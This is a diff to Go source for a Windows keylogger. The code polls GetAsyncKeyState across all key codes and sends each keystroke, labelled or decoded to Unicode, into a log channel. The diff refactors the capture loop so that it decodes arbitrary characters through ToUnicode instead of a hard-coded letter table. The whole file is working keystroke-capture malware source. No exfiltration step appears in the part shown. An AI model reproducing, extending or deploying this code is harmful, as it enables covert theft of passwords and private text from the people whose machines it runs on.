@@ -22,7 +22,7 @@ var (
 	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
 	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
 	procMapVirtualKey            = user32.NewProc("MapVirtualKeyA")
-	procToUnicodeEx              = user32.NewProc("ToUnicodeEx")
+	procToUnicode                = user32.NewProc("ToUnicode")
 
 	tmpTitle string
 )
@@ -66,15 +66,15 @@ func mapVirtualKey(uCode syscall.Handle) (scanCode syscall.Handle, err error) {
 	return
 }
 
-func toUnicodeEx(virtKey syscall.Handle, scanCode syscall.Handle, keyState *uint16, pwszBuff *uint16) (value syscall.Handle) {
+func toUnicode(virtKey syscall.Handle, scanCode syscall.Handle, keyState *uint16, pwszBuff *uint16) (value syscall.Handle) {
 	r0, _, _ := syscall.Syscall6(
-		procToUnicodeEx.Addr(),
+		procToUnicode.Addr(),
 		6,
 		uintptr(virtKey),
 		uintptr(scanCode),
 		uintptr(unsafe.Pointer(keyState)),
 		uintptr(unsafe.Pointer(pwszBuff)),
-		1,
+		256,
 		0,
 	)
 
@@ -160,401 +160,289 @@ func getLanguage() {
 	switch languageID {
 	case 409:
 		fmt.Printf("Language: %v \r\n", constants.US)
-		break
 	case 422:
 		fmt.Printf("Language: %v \r\n", constants.UA)
-		break
 	case 419:
 		fmt.Printf("Language: %v \r\n", constants.RU)
-		break
 	}
 }
 
-func getUnicodeKey(virtualCode syscall.Handle) {
+func getUnicodeKey(virtualCode int) string {
 	keyboardBuf := make([]uint16, 200)
 	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
 	if getKeyboardStateErr != nil {
 		log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
 	}
 
-	scanCode, mapVirtualKeyErr := mapVirtualKey(virtualCode)
+	scanCode, mapVirtualKeyErr := mapVirtualKey(syscall.Handle(virtualCode))
 	if mapVirtualKeyErr != nil {
 		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
 	}
 
 	unicodeBuf := make([]uint16, 200)
-	state := toUnicodeEx(virtualCode, scanCode, &keyboardBuf[0], &unicodeBuf[0])
-	fmt.Println("KEY BUFF ", keyboardBuf)
-	fmt.Println("SCAN CODE ", virtualCode, scanCode)
-	fmt.Println("UNICODE ", state, unicodeBuf)
+	toUnicode(syscall.Handle(virtualCode), scanCode, &keyboardBuf[0], &unicodeBuf[0])
+	return syscall.UTF16ToString(unicodeBuf)
 }
 
 func keyLogger() {
 	for {
 		time.Sleep(1 * time.Millisecond)
-		for KEY := 0; KEY <= 256; KEY++ {
-			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
+		for Key := 0; Key <= 256; Key++ {
+			Val, _, _ := procGetAsyncKeyState.Call(uintptr(Key))
 			if Val&0x1 == 0 {
 				continue
 			}
-			switch KEY {
+			switch Key {
 			case constants.VK_LBUTTON:
 				tmpKeylog <- "[LeftMouse]"
-				break
 			case constants.VK_RBUTTON:
 				tmpKeylog <- "[RightMouse]"
-				break
 			case constants.VK_MBUTTON:
 				tmpKeylog <- "[MiddleMouse]"
-				break
 			case constants.VK_BACK:
 				tmpKeylog <- "[Back]"
-				break
 			case constants.VK_TAB:
 				tmpKeylog <- "[Tab]"
-				break
 			case constants.VK_RETURN:
 				tmpKeylog <- "[Enter]\r\n"
-				break
 			case constants.VK_SHIFT:
 				tmpKeylog <- "[Shift]"
-				break
 			case constants.VK_MENU:
 				tmpKeylog <- "[Alt]"
-				break
 			case constants.VK_CAPITAL:
 				tmpKeylog <- "[CapsLock]"
-				break
 			case constants.VK_ESCAPE:
 				tmpKeylog <- "[Esc]"
-				break
 			case constants.VK_SPACE:
 				tmpKeylog <- " "
-				break
 			case constants.VK_PRIOR:
 				tmpKeylog <- "[PageUp]"
-				break
 			case constants.VK_NEXT:
 				tmpKeylog <- "[PageDown]"
-				break
 			case constants.VK_END:
 				tmpKeylog <- "[End]"
-				break
 			case constants.VK_HOME:
 				tmpKeylog <- "[Home]"
-				break
 			case constants.VK_LEFT:
 				tmpKeylog <- "[Left]"
-				break
 			case constants.VK_UP:
 				tmpKeylog <- "[Up]"
-				break
 			case constants.VK_RIGHT:
 				tmpKeylog <- "[Right]"
-				break
 			case constants.VK_DOWN:
 				tmpKeylog <- "[Down]"
-				break
 			case constants.VK_SELECT:
 				tmpKeylog <- "[Select]"
-				break
 			case constants.VK_PRINT:
 				tmpKeylog <- "[Print]"
-				break
 			case constants.VK_EXECUTE:
 				tmpKeylog <- "[Execute]"
-				break
 			case constants.VK_SNAPSHOT:
 				tmpKeylog <- "[PrintScreen]"
-				break
 			case constants.VK_INSERT:
 				tmpKeylog <- "[Insert]"
-				break
 			case constants.VK_DELETE:
 				tmpKeylog <- "[Delete]"
-				break
 			case constants.VK_HELP:
 				tmpKeylog <- "[Help]"
-				break
 			case constants.VK_LWIN:
 				tmpKeylog <- "[LeftWindows]"
-				break
 			case constants.VK_RWIN:
 				tmpKeylog <- "[RightWindows]"
-				break
 			case constants.VK_APPS:
 				tmpKeylog <- "[Applications]"
-				break
 			case constants.VK_SLEEP:
 				tmpKeylog <- "[Sleep]"
-				break
 			case constants.VK_NUMPAD0:
 				tmpKeylog <- "[Pad 0]"
-				break
 			case constants.VK_NUMPAD1:
 				tmpKeylog <- "[Pad 1]"
-				break
 			case constants.VK_NUMPAD2:
 				tmpKeylog <- "[Pad 2]"
-				break
 			case constants.VK_NUMPAD3:
 				tmpKeylog <- "[Pad 3]"
-				break
 			case constants.VK_NUMPAD4:
 				tmpKeylog <- "[Pad 4]"
-				break
 			case constants.VK_NUMPAD5:
 				tmpKeylog <- "[Pad 5]"
-				break
 			case constants.VK_NUMPAD6:
 				tmpKeylog <- "[Pad 6]"
-				break
 			case constants.VK_NUMPAD7:
 				tmpKeylog <- "[Pad 7]"
-				break
 			case constants.VK_NUMPAD8:
 				tmpKeylog <- "[Pad 8]"
-				break
 			case constants.VK_NUMPAD9:
 				tmpKeylog <- "[Pad 9]"
-				break
 			case constants.VK_MULTIPLY:
 				tmpKeylog <- "*"
-				break
 			case constants.VK_ADD:
 				tmpKeylog <- "+"
-				break
 			case constants.VK_SEPARATOR:
 				tmpKeylog <- "[Separator]"
-				break
 			case constants.VK_SUBTRACT:
 				tmpKeylog <- "-"
-				break
 			case constants.VK_DECIMAL:
 				tmpKeylog <- "."
-				break
 			case constants.VK_DIVIDE:
 				tmpKeylog <- "[Devide]"
-				break
 			case constants.VK_F1:
 				tmpKeylog <- "[F1]"
-				break
 			case constants.VK_F2:
 				tmpKeylog <- "[F2]"
-				break
 			case constants.VK_F3:
 				tmpKeylog <- "[F3]"
-				break
 			case constants.VK_F4:
 				tmpKeylog <- "[F4]"
-				break
 			case constants.VK_F5:
 				tmpKeylog <- "[F5]"
-				break
 			case constants.VK_F6:
 				tmpKeylog <- "[F6]"
-				break
 			case constants.VK_F7:
 				tmpKeylog <- "[F7]"
-				break
 			case constants.VK_F8:
 				tmpKeylog <- "[F8]"
-				break
 			case constants.VK_F9:
 				tmpKeylog <- "[F9]"
-				break
 			case constants.VK_F10:
 				tmpKeylog <- "[F10]"
-				break
 			case constants.VK_F11:
 				tmpKeylog <- "[F11]"
-				break
 			case constants.VK_F12:
 				tmpKeylog <- "[F12]"
-				break
 			case constants.VK_NUMLOCK:
 				tmpKeylog <- "[NumLock]"
-				break
 			case constants.VK_SCROLL:
 				tmpKeylog <- "[ScrollLock]"
-				break
 			case constants.VK_LSHIFT:
 				tmpKeylog <- "[LeftShift]"
-				break
 			case constants.VK_RSHIFT:
 				tmpKeylog <- "[RightShift]"
-				break
 			case constants.VK_LCONTROL:
 				tmpKeylog <- "[LeftCtrl]"
-				break
 			case constants.VK_RCONTROL:
 				tmpKeylog <- "[RightCtrl]"
-				break
 			case constants.VK_LMENU:
 				tmpKeylog <- "[LeftMenu]"
-				break
 			case constants.VK_RMENU:
 				tmpKeylog <- "[RightMenu]"
-				break
-			case constants.VK_OEM_1:
-				tmpKeylog <- ";"
-				break
-			case constants.VK_OEM_2:
-				tmpKeylog <- "/"
-				break
-			case constants.VK_OEM_3:
-				tmpKeylog <- "`"
-				break
-			case constants.VK_OEM_4:
-				tmpKeylog <- "["
-				break
-			case constants.VK_OEM_5:
-				tmpKeylog <- "\\"
-				break
-			case constants.VK_OEM_6:
-				tmpKeylog <- "]"
-				break
-			case constants.VK_OEM_7:
-				tmpKeylog <- "'"
-				break
-			case constants.VK_OEM_PERIOD:
-				tmpKeylog <- "."
-				break
-			case 0x30:
-				tmpKeylog <- "0"
-				break
-			case 0x31:
-				tmpKeylog <- "1"
-				break
-			case 0x32:
-				tmpKeylog <- "2"
-				break
-			case 0x33:
-				tmpKeylog <- "3"
-				break
-			case 0x34:
-				tmpKeylog <- "4"
-				break
-			case 0x35:
-				tmpKeylog <- "5"
-				break
-			case 0x36:
-				tmpKeylog <- "6"
-				break
-			case 0x37:
-				tmpKeylog <- "7"
-				break
-			case 0x38:
-				tmpKeylog <- "8"
-				break
-			case 0x39:
-				tmpKeylog <- "9"
-				break
-			case 0x41:
+			default:
 				getLanguage()
-				tmpKeylog <- "a"
-				break
-			case 0x42:
-				getLanguage()
-				tmpKeylog <- "b"
-				break
-			case 0x43:
-				getLanguage()
-				tmpKeylog <- "c"
-				break
-			case 0x44:
-				getLanguage()
-				tmpKeylog <- "d"
-				break
-			case 0x45:
-				getLanguage()
-				tmpKeylog <- "e"
-				break
-			case 0x46:
-				getLanguage()
-				tmpKeylog <- "f"
-				break
-			case 0x47:
-				getLanguage()
-				tmpKeylog <- "g"
-				break
-			case 0x48:
-				getLanguage()
-				tmpKeylog <- "h"
-				break
-			case 0x49:
-				getLanguage()
-				tmpKeylog <- "i"
-				break
-			case 0x4A:
-				getLanguage()
-				tmpKeylog <- "j"
-				break
-			case 0x4B:
-				getLanguage()
-				tmpKeylog <- "k"
-				break
-			case 0x4C:
-				getLanguage()
-				tmpKeylog <- "l"
-				break
-			case 0x4D:
-				getLanguage()
-				tmpKeylog <- "m"
-				break
-			case 0x4E:
-				getLanguage()
-				tmpKeylog <- "n"
-				break
-			case 0x4F:
-				getLanguage()
-				tmpKeylog <- "o"
-				break
-			case 0x50:
-				getLanguage()
-				tmpKeylog <- "p"
-				break
-			case 0x51:
-				getLanguage()
-				tmpKeylog <- "q"
-				break
-			case 0x52:
-				getLanguage()
-				tmpKeylog <- "r"
-				break
-			case 0x53:
-				getLanguage()
-				tmpKeylog <- "s"
-				break
-			case 0x54:
-				getLanguage()
-				tmpKeylog <- "t"
-				break
-			case 0x55:
-				getLanguage()
-				tmpKeylog <- "u"
-				break
-			case 0x56:
-				getLanguage()
-				tmpKeylog <- "v"
-				break
-			case 0x57:
-				getLanguage()
-				tmpKeylog <- "w"
-				break
-			case 0x58:
-				getLanguage()
-				tmpKeylog <- "x"
-				break
-			case 0x59:
-				getLanguage()
-				tmpKeylog <- "y"
-				break
-			case 0x5A:
-				getLanguage()
-				getUnicodeKey(0x5A)
-				tmpKeylog <- "z"
-				break
+				tmpKeylog <- getUnicodeKey(Key)
+				// case constants.VK_OEM_1:
+				// 	tmpKeylog <- ";"
+				// case constants.VK_OEM_2:
+				// 	tmpKeylog <- "/"
+				// case constants.VK_OEM_3:
+				// 	tmpKeylog <- "`"
+				// case constants.VK_OEM_4:
+				// 	tmpKeylog <- "["
+				// case constants.VK_OEM_5:
+				// 	tmpKeylog <- "\\"
+				// case constants.VK_OEM_6:
+				// 	tmpKeylog <- "]"
+				// case constants.VK_OEM_7:
+				// 	tmpKeylog <- "'"
+				// case constants.VK_OEM_PERIOD:
+				// 	tmpKeylog <- "."
+				// case 0x30:
+				// 	tmpKeylog <- "0"
+				// case 0x31:
+				// 	tmpKeylog <- "1"
+				// case 0x32:
+				// 	tmpKeylog <- "2"
+				// case 0x33:
+				// 	tmpKeylog <- "3"
+				// case 0x34:
+				// 	tmpKeylog <- "4"
+				// case 0x35:
+				// 	tmpKeylog <- "5"
+				// case 0x36:
+				// 	tmpKeylog <- "6"
+				// case 0x37:
+				// 	tmpKeylog <- "7"
+				// case 0x38:
+				// 	tmpKeylog <- "8"
+				// case 0x39:
+				// 	tmpKeylog <- "9"
+				// case 0x41:
+				// 	getLanguage()
+				// 	tmpKeylog <- "a"
+				// case 0x42:
+				// 	getLanguage()
+				// 	tmpKeylog <- "b"
+				// case 0x43:
+				// 	getLanguage()
+				// 	tmpKeylog <- "c"
+				// case 0x44:
+				// 	getLanguage()
+				// 	tmpKeylog <- "d"
+				// case 0x45:
+				// 	getLanguage()
+				// 	tmpKeylog <- "e"
+				// case 0x46:
+				// 	getLanguage()
+				// 	tmpKeylog <- "f"
+				// case 0x47:
+				// 	getLanguage()
+				// 	tmpKeylog <- "g"
+				// case 0x48:
+				// 	getLanguage()
+				// 	tmpKeylog <- "h"
+				// case 0x49:
+				// 	getLanguage()
+				// 	tmpKeylog <- "i"
+				// case 0x4A:
+				// 	getLanguage()
+				// 	tmpKeylog <- "j"
+				// case 0x4B:
+				// 	getLanguage()
+				// 	tmpKeylog <- "k"
+				// case 0x4C:
+				// 	getLanguage()
+				// 	tmpKeylog <- "l"
+				// case 0x4D:
+				// 	getLanguage()
+				// 	tmpKeylog <- "m"
+				// case 0x4E:
+				// 	getLanguage()
+				// 	tmpKeylog <- "n"
+				// case 0x4F:
+				// 	getLanguage()
+				// 	tmpKeylog <- "o"
+				// case 0x50:
+				// 	getLanguage()
+				// 	tmpKeylog <- "p"
+				// case 0x51:
+				// 	getLanguage()
+				// 	tmpKeylog <- "q"
+				// case 0x52:
+				// 	getLanguage()
+				// 	tmpKeylog <- "r"
+				// case 0x53:
+				// 	getLanguage()
+				// 	tmpKeylog <- "s"
+				// case 0x54:
+				// 	getLanguage()
+				// 	tmpKeylog <- "t"
+				// case 0x55:
+				// 	getLanguage()
+				// 	tmpKeylog <- "u"
+				// case 0x56:
+				// 	getLanguage()
+				// 	tmpKeylog <- "v"
+				// case 0x57:
+				// 	getLanguage()
+				// 	tmpKeylog <- "w"
+				// case 0x58:
+				// 	getLanguage()
+				// 	tmpKeylog <- "x"
+				// case 0x59:
+				// 	getLanguage()
+				// 	tmpKeylog <- "y"
+				// case 0x5A:
+				// 	getLanguage()
+				// 	getUnicodeKey(0x5A)
+				// 	tmpKeylog <- "z"
 			}
 		}
 	}
